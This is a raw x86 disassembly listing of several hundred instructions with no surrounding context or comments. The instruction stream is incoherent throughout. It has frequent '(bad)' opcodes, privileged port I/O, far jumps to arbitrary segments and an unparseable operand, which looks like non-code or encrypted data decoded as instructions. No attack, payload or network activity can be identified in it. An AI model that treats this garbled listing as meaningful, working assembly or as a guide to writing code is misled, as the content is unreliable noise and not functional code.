  423bc8:	das    
  423bc9:	or     eax,0x60dcbaa
  423bce:	retf   
  423bcf:	push   ebp
  423bd0:	pop    ebx
  423bd1:	push   eax
  423bd2:	jo     0x423bf6
  423bd4:	fwait
  423bd5:	test   eax,0x260fb084
  423bda:	test   DWORD PTR [edx+0x60],0x6ef5d727
  423be1:	fbld   TBYTE PTR [edx+0x5f]
  423be4:	mov    ebx,0xcc0c198e
  423be9:	std    
  423bea:	inc    edi
  423beb:	test   eax,0x33cd0251
  423bf0:	test   eax,0xab69ba04
  423bf5:	hlt    
  423bf6:	jnp    0x423be8
  423bf8:	cmp    BYTE PTR [ebx-0x1dec717c],bh
  423bfe:	in     eax,dx
  423bff:	outs   dx,BYTE PTR ds:[esi]
  423c00:	jmp    0x423c45
  423c02:	shl    BYTE PTR [eax],1
  423c04:	iret   
  423c05:	add    BYTE PTR ds:0x72dd2202,bh
  423c0b:	xchg   esp,eax
  423c0c:	jp     0x423bb6
  423c0e:	(bad)  
  423c0f:	and    esp,esp
  423c11:	or     edi,DWORD PTR [ebx]
  423c13:	mov    ah,BYTE PTR [ebx-0x76]
  423c16:	shl    DWORD PTR [ecx],cl
  423c18:	psllq  mm0,0x11
  423c1c:	or     al,0x13
  423c1e:	iret   
  423c1f:	mov    DWORD PTR [edi],ebx
  423c21:	sbb    dh,ah
  423c23:	into   
  423c24:	out    dx,eax
  423c25:	cli    
  423c26:	push   edi
  423c27:	rol    BYTE PTR [ebx],0xc4
  423c2a:	sbb    edx,esp
  423c2c:	aas    
  423c2d:	sub    BYTE PTR [edx-0x2c],dh
  423c30:	mov    ds,WORD PTR [edx-0x65795c18]
  423c36:	fisub  WORD PTR [ebp-0x5b00411f]
  423c3c:	or     DWORD PTR ds:0xd8c0f0fc,edi
  423c42:	cmp    al,0x3
  423c44:	fsub   st,st(6)
  423c46:	shr    BYTE PTR [eax+eax*2-0xf],cl
  423c4a:	in     eax,dx
  423c4b:	push   ss
  423c4c:	lahf   
  423c4d:	mov    ds:0x379989ce,al
  423c52:	icebp  
  423c53:	mov    bl,0x7b
  423c55:	jle    0x423c8a
  423c57:	jae    0x423c74
  423c59:	(bad)  
  423c5a:	cmp    dl,BYTE PTR [esi-0x6f31bd2a]
  423c60:	lea    ebp,[eax+0x7a]
  423c63:	push   eax
  423c64:	push   ebp
  423c65:	in     al,0xc
  423c67:	jns    0x423c33
  423c69:	outs   dx,DWORD PTR ds:[esi]
  423c6a:	add    eax,0xce72a18f
  423c6f:	scas   eax,DWORD PTR es:[edi]
  423c70:	lahf   
  423c71:	clc    
  423c72:	jo     0x423c59
  423c74:	mov    ecx,0x27387078
  423c79:	adc    al,0x9f
  423c7b:	jae    0x423cf9
  423c7d:	(bad)  
  423c7e:	and    eax,0x4dc87f19
  423c83:	pop    ebp
  423c84:	jbe    0x423c47
  423c86:	mov    DWORD PTR [edx+0x5a],ebp
  423c89:	je     0x423cf8
  423c8b:	ss cdq 
  423c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c8e:	xchg   esi,ebp
  423c90:	out    dx,eax
  423c91:	push   0xffffffdd
  423c93:	or     BYTE PTR [ebp+eiz*2-0x4e],cl
  423c97:	bound  ecx,QWORD PTR [eax]
  423c99:	repz add eax,0xe1cc0990
  423c9f:	mov    bh,0xb4
  423ca1:	dec    edx
  423ca2:	in     al,0xf6
  423ca4:	sbb    al,0x9
  423ca6:	pop    esi
  423ca7:	repnz xchg ebp,eax
  423ca9:	add    al,0xe1
  423cab:	sub    al,0xb6
  423cad:	cmp    al,0x82
  423caf:	sbb    ebx,DWORD PTR [eax+ebx*8-0x4f95a8c9]
  423cb6:	idiv   bh
  423cb8:	jbe    0x423c8a
  423cba:	pop    ecx
  423cbb:	push   0x32
  423cbd:	and    DWORD PTR [ecx-0x5f],0xa38b5de1
  423cc4:	cmp    BYTE PTR [ebx+eiz*2],dh
  423cc7:	lods   eax,DWORD PTR ds:[esi]
  423cc8:	imul   DWORD PTR [edx+ebp*1]
  423ccb:	jns    0x423d17
  423ccd:	inc    ebp
  423cce:	xchg   edi,eax
  423ccf:	push   ebp
  423cd0:	mov    esi,0xfd81f30
  423cd5:	aaa    
  423cd6:	addr16 push edi
  423cd8:	ror    esp,0x9d
  423cdb:	fwait
  423cdc:	mov    edi,0x1b00d920
  423ce1:	mov    dh,0xae
  423ce3:	mov    cl,0x13
  423ce5:	adc    ch,dh
  423ce7:	daa    
  423ce8:	pop    esp
  423ce9:	out    0x42,al
  423ceb:	inc    ecx
  423cec:	push   edi
  423ced:	adc    eax,0x90972b3c
  423cf2:	stos   BYTE PTR es:[edi],al
  423cf3:	push   0xbcc48802
  423cf8:	outs   dx,DWORD PTR ds:[esi]
  423cf9:	sub    edx,ecx
  423cfb:	sbb    DWORD PTR [edi+0x52dc9135],esp
  423d01:	shl    DWORD PTR [ebp+ebx*8-0x1e],0x85
  423d06:	clc    
  423d07:	inc    ebp
  423d08:	in     eax,0x0
  423d0a:	into   
  423d0b:	inc    esi
  423d0c:	int    0x86
  423d0e:	inc    edi
  423d0f:	mov    ds:0xfd37ab5a,eax
  423d14:	jp     0x423cce
  423d16:	sbb    edi,DWORD PTR [esi+0x4aa6a0c8]
  423d1c:	mov    ch,0xf5
  423d1e:	sar    DWORD PTR [eax-0x163a1306],cl
  423d24:	cmp    al,0x92
  423d26:	bound  ecx,QWORD PTR [edx]
  423d28:	ds jmp 0x423cf2
  423d2b:	mov    bl,0x26
  423d2d:	std    
  423d2e:	cs mov ebx,0xefbbcf06
  423d34:	xor    eax,0xbcb714ce
  423d39:	addr16 inc esi
  423d3b:	loopne 0x423cc9
  423d3d:	pop    ss
  423d3e:	(bad)  
  423d3f:	call   0x7820b6
  423d44:	es pop edx
  423d46:	retf   
  423d47:	sbb    DWORD PTR [ebp+0x7963533f],0x25
  423d4e:	ins    DWORD PTR es:[edi],dx
  423d4f:	in     al,dx
  423d50:	adc    cl,BYTE PTR [eax-0x63]
  423d53:	mov    ss,WORD PTR [ebp-0x19b1b1]
  423d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d5a:	sti    
  423d5b:	outs   dx,DWORD PTR ds:[esi]
  423d5c:	inc    esi
  423d5d:	sti    
  423d5e:	sub    DWORD PTR [eax-0x3],edx
  423d61:	pusha  
  423d62:	push   DWORD PTR [ebx-0x4d]
  423d65:	test   BYTE PTR [ebp+ebp*1-0x759b826a],al
  423d6c:	mov    esi,DWORD PTR [ebx+0x70]
  423d6f:	jecxz  0x423d12
  423d71:	mov    esi,0x3271062e
  423d76:	(bad)  
  423d77:	mov    eax,0x65d303ea
  423d7c:	aaa    
  423d7d:	adc    eax,0x9ca4065b
  423d82:	and    bl,BYTE PTR [eax]
  423d84:	sub    DWORD PTR [ebx+0x79],esi
  423d87:	push   ebp
  423d88:	lods   eax,DWORD PTR ds:[esi]
  423d89:	fwait
  423d8a:	aad    0x51
  423d8c:	in     al,0x3f
  423d8e:	outs   dx,BYTE PTR cs:[esi]
  423d90:	and    al,0x13
  423d92:	xor    DWORD PTR [ecx-0x16a53be],esp
  423d98:	push   ss
  423d99:	mov    BYTE PTR [ebp-0x70d8c9c9],al
  423d9f:	test   eax,0x230c7ace
  423da4:	inc    esi
  423da5:	jae    0x423d71
  423da7:	push   esi
  423da8:	mov    ebp,0x7cabdbfd
  423dad:	mov    ebx,0xe5e9614e
  423db2:	mov    ecx,ecx
  423db4:	sbb    BYTE PTR [ecx],bl
  423db6:	les    eax,FWORD PTR gs:[ecx-0x1b]
  423dba:	(bad)  
  423dbb:	scas   eax,DWORD PTR es:[edi]
  423dbc:	mov    dl,0xa3
  423dbe:	xor    eax,0xb1f728a0
  423dc3:	jns    0x423e28
  423dc5:	ss xor eax,0x4a45f2e8
  423dcb:	mov    bh,0xf3
  423dcd:	dec    esp
  423dce:	xor    al,BYTE PTR [esi-0x43de3a1d]
  423dd4:	jns    0x423e3d
  423dd6:	(bad)  
  423dd7:	jge    0x423d6b
  423dd9:	pop    ebx
  423dda:	dec    ebx
  423ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ddc:	pop    edx
  423ddd:	cs stos BYTE PTR es:[edi],al
  423ddf:	inc    edx
  423de0:	jb     0x423d8a
  423de2:	(bad)  
  423de3:	repnz (bad) 
  423de5:	mov    ebp,0xc9152c26
  423dea:	jecxz  0x423d6e
  423dec:	adc    cl,BYTE PTR [edx+0x36]
  423def:	call   FWORD PTR [ebp+0x1b62512e]
  423df5:	xor    al,0x51
  423df7:	adc    esi,DWORD PTR [edi-0x5e]
  423dfa:	mov    ebp,0x47626f0b
  423dff:	sub    al,0x4c
  423e01:	jne    0x423e75
  423e03:	rcr    ebx,cl
  423e05:	jno    0x423e36
  423e07:	and    DWORD PTR [ebp-0x9],edi
  423e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e0b:	xchg   ebp,eax
  423e0c:	jmp    0x423e89
  423e0e:	or     al,0xb6
  423e10:	xor    BYTE PTR [esi+0x74],cl
  423e13:	or     esi,DWORD PTR [edx+0x52f35423]
  423e19:	push   0xb01002ff
  423e1e:	pop    esp
  423e1f:	xchg   ebx,eax
  423e20:	int3   
  423e21:	cmp    al,0xc9
  423e23:	fistp  WORD PTR [ebp-0x44]
  423e26:	inc    edi
  423e27:	mov    edi,0xe021ec05
  423e2c:	xchg   esi,eax
  423e2d:	mov    DWORD PTR [ebp+eax*1-0x59],esp
  423e31:	call   0xf6ddf303
  423e36:	retf   
  423e37:	xor    cl,BYTE PTR [edi+0x6f]
  423e3a:	sub    esi,0x718fb085
  423e40:	test   ebp,ebp
  423e42:	xor    eax,0xa1f18b91
  423e47:	out    0x6c,eax
  423e49:	xor    BYTE PTR [esi+eax*4+0x73],ah
  423e4d:	dec    eax
  423e4e:	ds inc ebx
  423e50:	xchg   BYTE PTR [edi+esi*2],dh
  423e53:	aaa    
  423e54:	rol    dl,cl
  423e56:	cmc    
  423e57:	dec    esi
  423e58:	cld    
  423e59:	pop    eax
  423e5a:	dec    esi
  423e5b:	test   BYTE PTR [ecx+ebp*2+0x7d],dh
  423e5f:	sbb    ah,dh
  423e61:	and    esp,DWORD PTR [edx-0x78]
  423e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e65:	leave  
  423e66:	fnstsw WORD PTR [ecx-0x58]
  423e69:	loope  0x423ed5
  423e6b:	loope  0x423e8b
  423e6d:	test   ebx,edx
  423e6f:	pusha  
  423e70:	push   eax
  423e71:	add    BYTE PTR [edx+0x46b49302],al
  423e77:	or     al,0xaa
  423e79:	stos   BYTE PTR es:[edi],al
  423e7a:	pop    ds
  423e7b:	stos   BYTE PTR es:[edi],al
  423e7c:	xchg   ecx,eax
  423e7d:	jmp    0xba88b585
  423e82:	frstor [edi]
  423e84:	iret   
  423e85:	ror    DWORD PTR [esi+0x3e],1
  423e88:	xchg   esi,eax
  423e89:	sub    al,0xd5
  423e8b:	out    dx,eax
  423e8c:	push   esp
  423e8d:	scas   eax,DWORD PTR es:[edi]
  423e8e:	gs stc 
  423e90:	dec    eax
  423e91:	popa   
  423e92:	sub    al,0xc5
  423e94:	ds jmp 0x2eba:0xb3d61f01
  423e9c:	mov    bl,0x2a
  423e9e:	popa   
  423e9f:	mov    ds,edi
  423ea1:	aas    
  423ea2:	jae    0x423f22
  423ea4:	sub    ah,ch
  423ea6:	sahf   
  423ea7:	scas   eax,DWORD PTR es:[edi]
  423ea8:	scas   al,BYTE PTR es:[edi]
  423ea9:	push   ds
  423eaa:	sbb    eax,0x107591ac
  423eaf:	push   ecx
  423eb0:	mov    dl,0xa7
  423eb2:	nop
  423eb3:	clc    
  423eb4:	les    ebp,FWORD PTR [edx-0x1153b782]
  423eba:	loope  0x423e6e
  423ebc:	and    ecx,DWORD PTR [esi-0x3eaa3837]
  423ec2:	mov    eax,ds:0x39600c40
  423ec7:	or     al,0xd3
  423ec9:	mov    bh,0xed
  423ecb:	popf   
  423ecc:	fwait
  423ecd:	pop    esp
  423ece:	pop    esp
  423ecf:	aad    0xfc
  423ed1:	out    dx,eax
  423ed2:	pushf  
  423ed3:	mov    ebx,0xebb5559e
  423ed8:	mov    dl,0x8f
  423eda:	ret    
  423edb:	jg     0x423edd
  423edd:	psllw  mm5,QWORD PTR [edi]
  423ee0:	aad    0x5f
  423ee2:	inc    edx
  423ee3:	pusha  
  423ee4:	jge    0x423e6f
  423ee6:	fnstsw WORD PTR [edi]
  423ee8:	cmovnp ecx,DWORD PTR [eax+edx*8-0x51]
  423eed:	(bad)  
  423eee:	cld    
  423eef:	adc    dh,BYTE PTR [ecx]
  423ef1:	aas    
  423ef2:	inc    esi
  423ef3:	dec    ecx
  423ef4:	xchg   edi,eax
  423ef5:	iret   
  423ef6:	mov    ah,0x46
  423ef8:	ret    
  423ef9:	pop    esi
  423efa:	nop
  423efb:	ffreep st(7)
  423efd:	inc    edx
  423efe:	push   es
  423eff:	cs push edx
  423f01:	sub    dh,BYTE PTR [ecx]
  423f03:	fsubr  DWORD PTR [eax-0x39]
  423f06:	adc    dl,dl
  423f08:	jns    0x423f58
  423f0a:	dec    edi
  423f0b:	retf   
  423f0c:	cmp    DWORD PTR [edx],edx
  423f0e:	lahf   
  423f0f:	jmp    0x829c8b87
  423f14:	imul   ebx,DWORD PTR [esi-0x7e25560e],0x8606ac36
  423f1e:	sti    
  423f1f:	scas   al,BYTE PTR es:[edi]
  423f20:	cdq    
  423f21:	xor    DWORD PTR [esi+ecx*4],ecx
  423f24:	out    dx,al
  423f25:	xchg   DWORD PTR [ecx],esi
  423f27:	stos   DWORD PTR es:[edi],eax
  423f28:	push   0xffffff90
  423f2a:	test   al,0x3
  423f2c:	inc    esi
  423f2d:	lods   al,BYTE PTR ds:[esi]
  423f2e:	push   eax
  423f2f:	inc    eax
  423f30:	shl    BYTE PTR [ecx-0x1de523e0],1
  423f36:	gs inc edx
  423f38:	icebp  
  423f39:	adc    esp,eax
  423f3b:	push   ss
  423f3c:	fst    DWORD PTR [esi-0xa]
  423f3f:	jecxz  0x423fa3
  423f41:	aaa    
  423f42:	add    BYTE PTR [edi+0x68],dh
  423f45:	(bad)  
  423f46:	call   0x2a4c3e7b
  423f4b:	and    dh,ch
  423f4d:	imul   BYTE PTR [edi]
  423f4f:	inc    ebx
  423f50:	(bad)  
  423f51:	jle    0x423f64
  423f53:	push   ecx
  423f54:	mov    ebx,0x767dd4ed
  423f59:	mov    al,ds:0xb79218d2
  423f5e:	stos   DWORD PTR es:[edi],eax
  423f5f:	jmp    0x45ac:0x2357a993
  423f66:	inc    ebp
  423f67:	arpl   WORD PTR [edx-0x62],sp
  423f6a:	shr    edi,0x27
  423f6d:	jne    0x423ef2
  423f6f:	mov    ebp,0x1f1e2bdc
  423f74:	mov    ch,0x16
  423f76:	into   
  423f77:	xchg   esp,eax
  423f78:	xchg   ebx,eax
  423f79:	leave  
  423f7a:	retf   0x7917
  423f7d:	lock pop ebx
  423f7f:	jmp    0x423fd0
  423f81:	clc    
  423f82:	daa    
  423f83:	(bad)  
  423f84:	mov    ecx,0xc2fcc37d
  423f89:	add    dl,BYTE PTR [ecx-0x2188b5b2]
  423f8f:	jae    0x423f1f
  423f91:	mov    ecx,0x831fcf4e
  423f96:	in     eax,dx
  423f97:	out    0xea,al
  423f99:	mov    eax,0xbca8dc7b
  423f9e:	ins    DWORD PTR es:[edi],dx
  423f9f:	xor    dl,bh
  423fa1:	aas    
  423fa2:	daa    
  423fa3:	pop    edi
  423fa4:	loope  0x423f2a
  423fa6:	mov    ebp,0x3c6c89df
  423fab:	or     dl,ch
  423fad:	mov    bl,BYTE PTR [ebp+0x6fb4779a]
  423fb3:	add    bl,BYTE PTR [eax+0x59]
  423fb6:	fbld   TBYTE PTR [edx+0x40203fd9]
  423fbc:	sbb    al,0x60
  423fbe:	xchg   cl,cl
  423fc0:	mov    ecx,0x46ae9fe2
  423fc5:	push   edi
  423fc6:	in     eax,0x1
  423fc8:	adc    BYTE PTR [edx],ch
  423fca:	xor    ebx,DWORD PTR [esi+0x5219b196]
  423fd0:	adc    eax,0xc1e03d45
  423fd5:	in     eax,0x5f
  423fd7:	out    0x21,al
  423fd9:	enter  0xa8a,0xdf
  423fdd:	neg    DWORD PTR [edx-0x56]
  423fe0:	pop    ebx
  423fe1:	adc    al,0xac
  423fe3:	cmc    
  423fe4:	pop    esi
  423fe5:	pop    edx
  423fe6:	inc    ebx
  423fe7:	sbb    al,0xe8
  423fe9:	call   0xb14:0xae030c6b
  423ff0:	cs xchg esi,eax
  423ff2:	mov    dh,0xb2
  423ff4:	push   es
  423ff5:	or     BYTE PTR [esi+0x11c2541e],dh
  423ffb:	(bad)  
  423ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ffd:	jbe    0x424036
  423fff:	mov    ss,WORD PTR [ecx+0x7bddb6c5]
  424005:	adc    eax,0xd25c0dbd
  42400a:	nop
  42400b:	nop
  42400c:	dec    ecx
  42400d:	adc    al,BYTE PTR [esi+0x0]
  424010:	in     al,0x93
  424012:	rol    DWORD PTR [ecx-0x36],0x83
  424016:	sub    al,0x1d
  424018:	mov    ecx,0xa5d4d8b6
  42401d:	xor    al,cl
  42401f:	(bad)  
  424020:	xor    eax,DWORD PTR [edi+eiz*2]
  424023:	das    
  424024:	sbb    al,0xdf
  424026:	daa    
  424027:	enter  0x277f,0x37
  42402b:	daa    
  42402c:	push   es
  42402d:	fisub  DWORD PTR [eax+0xc]
  424030:	lods   eax,DWORD PTR ds:[esi]
  424031:	dec    ebx
  424032:	sahf   
  424033:	ja     0x423fbc
  424035:	and    DWORD PTR [eax],ebp
  424037:	inc    edi
  424038:	lahf   
  424039:	test   al,0x9b
  42403b:	mov    edx,0x94326c23
  424040:	into   
  424041:	add    esi,DWORD PTR [edx+0x71efa9ad]
  424047:	xchg   edi,eax
  424048:	xor    ebx,DWORD PTR [ebp-0x23c698ac]
  42404e:	inc    edx
  42404f:	mov    ecx,0xf83b7199
  424054:	sub    al,0x13
  424056:	push   0xffffff81
  424058:	lea    esi,[edx]
  42405a:	push   esp
  42405b:	stc    
  42405c:	ins    BYTE PTR es:[edi],dx
  42405d:	imul   BYTE PTR [esi+0x56]
  424060:	jmp    0x424088
  424062:	adc    ah,0x8
  424065:	data16 icebp 
  424067:	inc    ebx
  424068:	ins    DWORD PTR es:[edi],dx
  424069:	mov    eax,ds:0xa8f4fce0
  42406e:	mov    dl,0x88
  424070:	test   edi,esi
  424072:	jecxz  0x424005
  424074:	shl    BYTE PTR [esi-0x1f],1
  424077:	xchg   DWORD PTR [eax],edi
  424079:	adc    ecx,edx
  42407b:	sub    ah,BYTE PTR [ebx]
  42407d:	(bad)  
  42407e:	fistp  DWORD PTR [ecx+0x3b]
  424081:	push   ebx
  424082:	hlt    
  424083:	xor    al,0xd9
  424085:	data16 jl 0x42404c
  424088:	jbe    0x424018
  42408a:	mov    al,0xb0
  42408c:	mov    bl,0x66
  42408e:	xor    edx,esp
  424090:	loope  0x424086
  424092:	sbb    edi,esp
  424094:	cdq    
  424095:	and    BYTE PTR [edx-0x21],0xa8
  424099:	or     al,0x6d
  42409b:	sub    BYTE PTR [edi-0x4a4c82e0],ch
  4240a1:	ss xchg edx,eax
  4240a3:	cmp    edi,DWORD PTR [eax-0x70]
  4240a6:	pop    esp
  4240a7:	dec    ebx
  4240a8:	push   edx
  4240a9:	adc    eax,DWORD PTR [esi+0x20]
  4240ac:	pushf  
  4240ad:	and    BYTE PTR cs:[ebx+0x5fe36ece],bl
  4240b4:	adc    DWORD PTR [eax+0x67413bea],0x1977f470
  4240be:	fwait
  4240bf:	jns    0x424065
  4240c1:	and    cl,BYTE PTR [esi]
  4240c3:	loope  0x424099
  4240c5:	icebp  
  4240c6:	inc    ebx
  4240c7:	push   ds
  4240c8:	sub    ebx,DWORD PTR [eax-0x8]
  4240cb:	inc    edx
  4240cc:	inc    esi
  4240cd:	push   edx
  4240ce:	jbe    0x4240dd
  4240d0:	call   0xfde1a0df
  4240d5:	aad    0x45
  4240d7:	repz jmp 0x5925:0xd15b1710
  4240df:	es shl ch,1
  4240e2:	pop    ecx
  4240e3:	mov    ebp,0x580ca561
  4240e8:	loope  0x4240dd
  4240ea:	scas   al,BYTE PTR es:[edi]
  4240eb:	inc    esi
  4240ec:	add    BYTE PTR [eax-0x2a],ah
  4240ef:	jns    0x424088
  4240f1:	stos   DWORD PTR es:[edi],eax
  4240f2:	jl     0x424150
  4240f4:	mov    dl,0xf1
  4240f6:	pop    ss
  4240f7:	push   0xfffffffd
  4240f9:	test   BYTE PTR [esi],0x4e
  4240fc:	loope  0x4240f3
  4240fe:	inc    eax
  4240ff:	call   0x3619f5b7
  424104:	test   eax,0x8d2291f4
  424109:	sar    DWORD PTR [ebx-0x1c1d1366],cl
  42410f:	aas    
  424110:	(bad)  
  424111:	cmp    al,0x70
  424113:	test   DWORD PTR ds:0xd63e9f5b,edx
  424119:	data16 xor BYTE PTR [ecx],dh
  42411c:	mov    esp,ecx
  42411e:	pop    ecx
  42411f:	popa   
  424120:	or     dl,BYTE PTR [eax+0x208dcfd]
  424126:	push   esi
  424127:	sbb    cl,BYTE PTR [edi]
  424129:	dec    ebp
  42412a:	pop    eax
  42412b:	imul   DWORD PTR [ecx-0x20]
  42412e:	jmp    0xb93e11a0
  424133:	dec    esp
  424134:	mov    dl,0x1f
  424136:	int    0xc3
  424138:	int3   
  424139:	xor    eax,0xed79d81c
  42413e:	test   edi,edx
  424140:	loope  0x4241b4
  424142:	pop    es
  424143:	in     al,0xd0
  424145:	mov    esp,DWORD PTR [esi-0x58]
  424148:	aad    0x2f
  42414a:	pop    esi
  42414b:	jb     0x424147
  42414d:	sbb    al,0xf6
  42414f:	push   esp
  424150:	jle    0x42418a
  424152:	jo     0x42414f
  424154:	outs   dx,BYTE PTR ds:[esi]
  424155:	sbb    dh,BYTE PTR [edx-0x61b0b5e8]
  42415b:	add    eax,0x8b683cc
  424160:	lahf   
  424161:	jg     0x424141
  424163:	test   eax,0x25f813bb
  424168:	test   DWORD PTR [eax+0x59234c7f],edx
  42416e:	(bad)  
  42416f:	shr    ebp,cl
  424171:	(bad)  
  424172:	imul   ebp,DWORD PTR [ecx+ebp*1],0x3e
  424176:	dec    esi
  424177:	imul   esi,DWORD PTR [edx+eiz*4],0xe
  42417b:	in     al,0xe1
  42417d:	(bad)  
  42417e:	in     al,dx
  42417f:	call   0xf035:0x56c00de8
  424186:	add    ah,cl
  424188:	jb     0x4241c8
  42418a:	loope  0x4241be
  42418c:	(bad)  
  42418d:	push   DWORD PTR [edi]
  42418f:	or     eax,0x297158ad
  424194:	ja     0x424177
  424196:	jb     0x424137
  424198:	dec    ebx
  424199:	pop    eax
  42419a:	lock jge 0x424169
  42419d:	cmp    esp,ecx
  42419f:	cmp    eax,0x7bf6d809
  4241a4:	mov    eax,0x3d4bf4ad
  4241a9:	shl    bl,cl
  4241ab:	cmp    BYTE PTR [edx+0x52],al
  4241ae:	jg     0x424184
  4241b0:	fdivr  DWORD PTR [ebx-0x1d89f9ae]
  4241b6:	ins    BYTE PTR es:[edi],dx
  4241b7:	and    ebp,DWORD PTR [edi+0x2ce4a74]
  4241bd:	repnz inc esi
  4241bf:	jo     0x4241dc
  4241c1:	ja     0x4241b2
  4241c3:	retf   
  4241c4:	ins    BYTE PTR es:[edi],dx
  4241c5:	loopne 0x4241fd
  4241c7:	pop    ds
  4241c8:	jmp    0x1d4cf0c5
  4241cd:	pop    ds
  4241ce:	xor    edi,DWORD PTR [ecx+0x42aadefd]
  4241d4:	nop
  4241d5:	xchg   DWORD PTR [ecx+edi*4],ecx
  4241d8:	mov    al,BYTE PTR [ecx-0x4662634a]
  4241de:	sbb    DWORD PTR [edx],esp
  4241e0:	push   edx
  4241e1:	and    ah,al
  4241e3:	mov    bl,0xc9
  4241e5:	xchg   esi,eax
  4241e6:	fimul  WORD PTR [edx]
  4241e8:	sbb    eax,0xfd772d08
  4241ed:	loop   0x424170
  4241ef:	xor    al,0x3a
  4241f1:	dec    eax
  4241f2:	pop    ebp
  4241f3:	push   esi
  4241f4:	jmp    0x424190
  4241f6:	ds inc esi
  4241f8:	sub    BYTE PTR [eax],cl
  4241fa:	jmp    0xab88:0x107c4266
  424201:	daa    
  424202:	lods   eax,DWORD PTR ds:[esi]
  424203:	inc    BYTE PTR [esi]
  424205:	rcl    al,0x7d
  424208:	adc    ebp,DWORD PTR [ebx-0x59]
  42420b:	sbb    edi,ecx
  42420d:	fld    DWORD PTR [edx+0xb62857e]
  424213:	in     eax,dx
  424214:	sbb    eax,0xd96ec86f
  424219:	loope  0x424200
  42421b:	ins    DWORD PTR es:[edi],dx
  42421c:	mov    ebx,0xd652640f
  424221:	js     0x4241e9
  424223:	inc    esp
  424224:	mov    ecx,0x246cd8c
  424229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42422a:	scas   eax,DWORD PTR es:[edi]
  42422b:	jbe    0x424216
  42422d:	xor    DWORD PTR [edi-0x1f2d14b0],0xb8110098
  424237:	fcomip st,st(5)
  424239:	and    eax,0x3a451855
  42423e:	rol    DWORD PTR [edi],cl
  424240:	xchg   BYTE PTR [ebp+ecx*1-0x2bbee179],ch
  424247:	pop    eax
  424248:	jbe    0x4241ff
  42424a:	jle    0x4242a8
  42424c:	les    edx,FWORD PTR [ebx+ebx*8]
  42424f:	fadd   st(7),st
  424251:	pop    esp
  424252:	out    0xc7,eax
  424254:	hlt    
  424255:	xchg   esi,eax
  424256:	mov    cl,BYTE PTR [edi+eax*1]
  424259:	push   ss
  42425a:	in     eax,dx
  42425b:	or     BYTE PTR [ebx],bl
  42425d:	mov    gs,WORD PTR [edi+ecx*4]
  424260:	stos   DWORD PTR es:[edi],eax
  424261:	xchg   esi,eax
  424262:	push   esi
  424263:	outs   dx,DWORD PTR ds:[esi]
  424264:	inc    eax
  424265:	jns    0x4241e8
  424267:	mov    dh,0xb5
  424269:	adc    DWORD PTR [edi],0x9edcff7e
  42426f:	mov    eax,0xb951ed29
  424274:	loopne 0x424204
  424276:	pop    es
  424277:	rol    DWORD PTR [ebp+0x70],cl
  42427a:	pop    DWORD PTR [eax-0x6ec4b90a]
  424280:	push   ecx
  424281:	cdq    
  424282:	push   esi
  424283:	xor    al,0xf5
  424285:	mov    cl,0x57
  424287:	inc    eax
  424288:	aam    0x51
  42428a:	das    
  42428b:	(bad)  
  42428c:	pop    edx
  42428d:	or     esp,0xfffffff0
  424290:	and    al,0xbd
  424292:	fs adc eax,0xbb86ddf1
  424298:	xchg   ebx,eax
  424299:	xor    ebp,edi
  42429b:	mov    bl,0x37
  42429d:	and    ebx,edx
  42429f:	int3   
  4242a0:	mov    cl,0xf4
  4242a2:	or     dh,BYTE PTR [ebx-0x4ec8e59a]
  4242a8:	xchg   edi,eax
  4242a9:	arpl   WORD PTR [eax+0x7],bp
  4242ac:	dec    edi
  4242ad:	call   0x1026:0xc6700fa6
  4242b4:	sub    al,0x43
  4242b6:	mov    ds,WORD PTR [ebx-0x25356579]
  4242bc:	fistp  WORD PTR [eax-0x7bf60056]
  4242c2:	addr16 sub cl,bl
  4242c5:	cmp    eax,0xad725eff
  4242ca:	mov    ?,ebp
  4242cc:	out    0xfa,al
  4242ce:	fmul   st,st(2)
  4242d0:	sbb    DWORD PTR [ecx],ebp
  4242d2:	push   es
  4242d3:	mov    ecx,DWORD PTR [edx-0x289db6dd]
  4242d9:	push   0xe297511
  4242de:	jns    0x4242f6
  4242e0:	push   edx
  4242e1:	rcr    DWORD PTR [edx],0x89
  4242e4:	call   0xeb63:0x775fa8c
  4242eb:	xchg   BYTE PTR [ebp-0x20],al
  4242ee:	data16 fild DWORD PTR [edi-0x7c3d2411]
  4242f5:	push   cs
  4242f6:	sub    BYTE PTR [esi+0x3dd88fbb],ah
  4242fc:	(bad)  
  4242fe:	pop    ds
  4242ff:	(bad)  
  424300:	mov    ds:0x6bbf05b0,eax
  424305:	push   ebp
  424306:	mov    esp,0x7e8e17cb
  42430b:	repnz inc edx
  42430d:	pop    ss
  42430e:	mov    esp,0x74c90949
  424313:	mov    edi,0xc0717a33
  424318:	mov    ecx,0x2e1d7ffa
  42431d:	mov    ds:0x52c83dc7,al
  424322:	repz daa 
  424324:	adc    BYTE PTR [ecx],ah
  424326:	bound  esi,QWORD PTR [ecx]
  424328:	pop    esi
  424329:	add    DWORD PTR [edx+ebp*8-0x2d],esi
  42432d:	cmp    al,0xd8
  42432f:	shr    ah,1
  424331:	jo     0x424395
  424333:	xchg   DWORD PTR [ecx-0x5f8c11ae],ebp
  424339:	lds    edx,FWORD PTR [edi]
  42433b:	sub    al,0xd0
  42433d:	retf   
  42433e:	out    dx,eax
  42433f:	int    0x7
  424341:	shl    DWORD PTR [edx-0x1bef010b],0xa5
  424348:	jns    0x4242db
  42434a:	in     al,0x12
  42434c:	loope  0x42432b
  42434e:	inc    esp
  42434f:	(bad)  
  424350:	je     0x424311
  424352:	push   0x18
  424354:	fcmovnu st,st(2)
  424356:	sbb    BYTE PTR [ecx+0x5d962750],dl
  42435c:	sbb    bh,BYTE PTR [ecx+edx*2+0x650980b2]
  424363:	aam    0xa6
  424365:	aam    0x9d
  424367:	fst    QWORD PTR [edi+0x68f15737]
  42436d:	bound  esi,QWORD PTR [ebp-0x13c302be]
  424373:	rcl    DWORD PTR [ebp+0x12],1
  424376:	cmc    
  424377:	jmp    0x7f38:0xe00b0413
  42437e:	pop    esp
  42437f:	pusha  
  424380:	ror    DWORD PTR [eax-0x36],1
  424383:	inc    ecx
  424384:	mov    ch,cl
  424386:	mov    al,0xd7
  424388:	ds adc eax,0x4b75ce86
  42438e:	and    eax,0x167ab965
